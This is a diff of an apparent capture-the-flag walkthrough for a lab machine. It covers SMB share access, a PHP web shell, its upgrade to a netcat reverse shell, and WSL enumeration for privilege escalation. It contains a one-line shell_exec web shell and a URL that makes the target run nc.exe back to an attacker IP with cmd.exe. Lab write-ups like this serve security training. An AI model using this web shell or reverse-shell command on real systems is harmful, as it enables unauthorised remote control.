@@ -99,21 +99,46 @@ spx,txt``
 ``smbclient -U 'tyler' //10.10.10.97/new-site``                                      
                                         
 ![image](https://user-images.githubusercontent.com/123066149/222890282-4e9f5ae1-159c-47cc-a0e1-7b94954f5a50.png)
-                                    
+  
+### I used this web shell which worked :
+
+![image](https://user-images.githubusercontent.com/123066149/222894266-38576b90-22a8-4f6d-b431-8193a765b3b0.png)
+
+### This webshell could also work
+
+``<?php echo shell_exec($_GET["c"]); ?>``  
+
+### Upgrade Webshell to Reverse Shell
+
 ![image](https://user-images.githubusercontent.com/123066149/222890258-a516a07a-8ed6-4541-ad06-7f976eb74288.png)
+
+![image](https://user-images.githubusercontent.com/123066149/222890342-17ee1e4c-bf9b-4796-9ea5-4256f7e1ead0.png)
 
 ``http://10.10.10.97:8808/php_cmd.php?cmd=nc.exe%2010.10.16.2%201234%20-e%20cmd.exe``
                     
-![image](https://user-images.githubusercontent.com/123066149/222890342-17ee1e4c-bf9b-4796-9ea5-4256f7e1ead0.png)
- 
 ![image](https://user-images.githubusercontent.com/123066149/222890381-e2f09cd0-4d2b-4535-bf1c-8c565d380b14.png)
                    
 # ${{\color{purple}Privilege Escalation}}\ $
-                    
+
+### Enumeration of the C:\ reveals the file "Ubuntu.zip" and a "Distros\Ubuntu" folder. Potentially
+### Windows Subsystem for Linux (WSL) has been installed?
+
 ![image](https://user-images.githubusercontent.com/123066149/222890424-70d67952-7335-4f72-bb1e-c7449659e818.png)
-                    
- ![image](https://user-images.githubusercontent.com/123066149/222891298-07eeb349-09d1-495e-b025-1408516d3f6b.png)                   
+ 
+### The Linux filesystem is enumerated.
+
+``ls C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs``
+
+![image](https://user-images.githubusercontent.com/123066149/222891298-07eeb349-09d1-495e-b025-1408516d3f6b.png)                   
 
 # ${{\color{purple}Points of Improvement}}\ $
+
+* There was another way to gain access to the share :
+
+![image](https://user-images.githubusercontent.com/123066149/222894535-75d500df-752d-4782-b081-e575bdf5f6fa.png)
+
+![image](https://user-images.githubusercontent.com/123066149/222894541-e612b38d-cb8a-4601-adff-8baefa71a814.png)
+
+![image](https://user-images.githubusercontent.com/123066149/222894553-0c90f351-5a39-4114-8b27-e89149e7a14f.png)
 
 
